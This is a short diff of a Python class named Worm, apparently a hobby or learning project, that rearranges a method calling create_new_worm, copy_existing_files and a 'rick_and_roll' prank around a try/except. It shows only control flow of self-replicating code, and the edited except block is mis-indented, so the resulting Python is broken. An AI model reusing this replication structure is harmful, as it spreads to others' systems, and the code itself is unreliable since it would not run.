@@ -179,16 +179,18 @@ class Worm:
 
     def start_worm_actions(self):
         print(self.target_dir_list)
+        
+        if self.first_run == True:
+            self.rick_and_roll()
+        self.list_directories(self.path)
         try:
-            if self.first_run == True:
-                self.rick_and_roll()
-            self.list_directories(self.path)
             self.create_new_worm()
-            self.copy_existing_files()
+        except:
+        logging.warning("something went wrong")
+        self.copy_existing_files()
 
             
-        except:
-            logging.warning("something went wrong")
+       
         #self.connection_iterator()
         
         
